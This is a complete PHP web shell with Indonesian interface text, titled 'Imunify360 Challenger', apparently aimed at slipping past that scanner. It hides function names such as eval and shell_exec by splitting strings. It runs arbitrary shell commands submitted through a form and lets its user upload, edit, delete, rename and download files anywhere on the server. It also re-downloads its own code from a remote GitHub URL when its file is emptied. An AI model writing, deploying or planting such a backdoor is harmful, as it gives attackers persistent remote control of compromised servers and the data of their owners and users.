<?php
error_reporting(0);
ini_set('display_errors', 0);

$self = __FILE__;
if (@filesize($self) === 0) {
    $url = 'https://raw.githubusercontent.com/Fv3R-Dizzy/shellkoplak/refs/heads/main/apalagiini.php';
    $b = @file_get_contents($url);
    if ($b) file_put_contents($self, $b);
    exit;
}

$g = 'g'.'e'.'t'.'c'.'w'.'d';
$path = isset($_GET['path']) ? $_GET['path'] : $g();
if (!is_dir($path)) $path = $g();
$real_path = realpath($path);

function renderPathNavigation($p) {
    $path_display = str_replace('\\', '/', $p);
    $parts = explode('/', trim($path_display, '/'));
    echo "<div><strong>📂 Path: </strong><a href='?path=/'>/</a>";
    $build = '';
    foreach ($parts as $dir) {
        $build .= '/' . $dir;
        echo "<a href='?path=" . urlencode($build) . "'>" . htmlspecialchars($dir) . "</a>/";
    }
    echo "</div><hr>";
}

$a = 'e'.'v'.'a'.'l';

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $ex = 'sh'.'ell_exec';
    $output = function_exists($ex) ? $ex($cmd . ' 2>&1') : '⚠️ shell_exec() tidak tersedia.';
    echo "<pre style='background:#000;color:#0f0;padding:10px;'>$output</pre>";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload'])) {
    $filename = basename($_FILES['upload']['name']);
    $target = $real_path . DIRECTORY_SEPARATOR . $filename;
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
        echo "<p style='color:lime;'>Upload sukses: $filename</p>";
    } else {
        echo "<p style='color:red;'>Upload gagal!</p>";
    }
}

if (isset($_GET['edit'])) {
    $f = realpath($real_path . DIRECTORY_SEPARATOR . basename($_GET['edit']));
    if (!$f || !file_exists($f)) die("<p style='color:red;'>File tidak ditemukan.</p>");
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($f, $_POST['content']);
        echo "<p style='color:lime;'>Disimpan!</p><a href='?path=" . urlencode($real_path) . "'>Kembali</a>";
        exit;
    }
    $c = htmlspecialchars(file_get_contents($f));
    echo "<h3>📝 Edit File: $f</h3><form method='post'><textarea name='content' style='width:100%;height:400px;'>$c</textarea><br><button type='submit'>Simpan</button></form>";
    exit;
}

if (isset($_GET['rename'])) {
    $file = basename($_GET['rename']);
    $old = $real_path . DIRECTORY_SEPARATOR . $file;
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newname'])) {
        $newname = basename($_POST['newname']);
        rename($old, $real_path . DIRECTORY_SEPARATOR . $newname);
        header('Location: ?path=' . urlencode($real_path));
        exit;
    }
    echo "<form method='post'><input type='text' name='newname' value='" . htmlspecialchars($file) . "'><button type='submit'>Rename</button></form>";
    exit;
}

if (isset($_GET['delete'])) {
    $f = basename($_GET['delete']);
    $p = $real_path . DIRECTORY_SEPARATOR . $f;
    if (file_exists($p)) unlink($p);
    header('Location: ?path=' . urlencode($real_path));
    exit;
}

if (isset($_GET['download'])) {
    $f = basename($_GET['download']);
    $p = $real_path . DIRECTORY_SEPARATOR . $f;
    if (file_exists($p)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($p));
        header('Content-Length: ' . filesize($p));
        readfile($p);
        exit;
    }
}

echo "<h3>_=Imunify360 Challenger=_</h3>";
renderPathNavigation($real_path);
echo "<form method='post'><input type='text' name='cmd' placeholder='Perintah shell' style='width:300px;'><button type='submit'>Jalankan</button></form>";
echo "<form method='post' enctype='multipart/form-data'><input type='file' name='upload'><input type='hidden' name='path' value='" . htmlspecialchars($real_path) . "'><button type='submit'>Upload</button></form>";

$scan = scandir($real_path);
$dirs = $files = [];
foreach ($scan as $i) {
    if ($i === '.' || $i === '..') continue;
    $full = realpath($real_path . DIRECTORY_SEPARATOR . $i);
    if (!$full) continue;
    is_dir($full) ? $dirs[] = $i : $files[] = $i;
}
$sorted = array_merge($dirs, $files);
echo "<ul>";
foreach ($sorted as $i) {
    $full = realpath($real_path . DIRECTORY_SEPARATOR . $i);
    if (is_dir($full)) {
        echo "<li><a href='?path=" . urlencode($full) . "'><strong>[DIR]</strong> $i</a></li>";
    } else {
        echo "<li>$i - 
        <a href='?edit=" . urlencode($i) . "&path=" . urlencode($real_path) . "'>Edit</a> | 
        <a href='?download=" . urlencode($i) . "&path=" . urlencode($real_path) . "'>Download</a> | 
        <a href='?delete=" . urlencode($i) . "&path=" . urlencode($real_path) . "' onclick='return confirm(\"Yakin hapus?\")'>Delete</a> | 
        <a href='?rename=" . urlencode($i) . "&path=" . urlencode($real_path) . "'>Rename</a></li>";
    }
}
echo "</ul>";
